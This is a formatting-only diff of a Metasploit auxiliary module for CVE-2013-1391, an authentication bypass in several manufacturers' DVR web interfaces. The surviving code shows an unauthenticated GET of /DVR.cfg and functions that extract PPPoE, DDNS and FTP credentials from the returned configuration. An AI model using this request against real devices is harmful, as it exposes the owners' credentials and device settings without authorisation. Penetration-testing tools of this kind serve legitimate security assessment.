@@ -10,29 +10,25 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'        => 'Multiple DVR Manufacturers Configuration Disclosure',
+      'Name' => 'Multiple DVR Manufacturers Configuration Disclosure',
       'Description' => %q{
           This module takes advantage of an authentication bypass vulnerability at the
         web interface of multiple manufacturers DVR systems, which allows to retrieve the
         device configuration.
       },
-      'Author'      =>
-        [
-          'Alejandro Ramos', # Vulnerability Discovery
-          'juan vazquez' # Metasploit module
-        ],
-      'References'  =>
-        [
-          [ 'CVE', '2013-1391' ],
-          [ 'URL', 'http://www.securitybydefault.com/2013/01/12000-grabadores-de-video-expuestos-en.html' ]
-        ],
-      'License'     => MSF_LICENSE
+      'Author' => [
+        'Alejandro Ramos', # Vulnerability Discovery
+        'juan vazquez' # Metasploit module
+      ],
+      'References' => [
+        [ 'CVE', '2013-1391' ],
+        [ 'URL', 'http://www.securitybydefault.com/2013/01/12000-grabadores-de-video-expuestos-en.html' ]
+      ],
+      'License' => MSF_LICENSE
     )
-
   end
 
   def get_pppoe_credentials(conf)
-
     user = ""
     password = ""
     enabled = ""
@@ -62,15 +58,13 @@ class MetasploitModule < Msf::Auxiliary
     }
 
     report_note({
-      :host   => rhost,
-      :data   => info,
-      :type   => "dvr.pppoe.conf",
-      :sname  => 'pppoe',
+      :host => rhost,
+      :data => info,
+      :type => "dvr.pppoe.conf",
+      :sname => 'pppoe',
       :update => :unique_data
     })
-
   end
-
 
   def get_ddns_credentials(conf)
     hostname = ""
@@ -107,13 +101,12 @@ class MetasploitModule < Msf::Auxiliary
     }
 
     report_note({
-      :host   => rhost,
-      :data   => info,
-      :type   => "dvr.ddns.conf",
-      :sname  => 'ddns',
+      :host => rhost,
+      :data => info,
+      :type => "dvr.ddns.conf",
+      :sname => 'ddns',
       :update => :unique_data
     })
-
   end
 
   def get_ftp_credentials(conf)
@@ -242,10 +235,9 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run_host(ip)
-
     res = send_request_cgi({
-      'uri'          => '/DVR.cfg',
-      'method'       => 'GET'
+      'uri' => '/DVR.cfg',
+      'method' => 'GET'
     })
 
     if not res or res.code != 200 or res.body.empty? or res.body !~ /CAMERA/
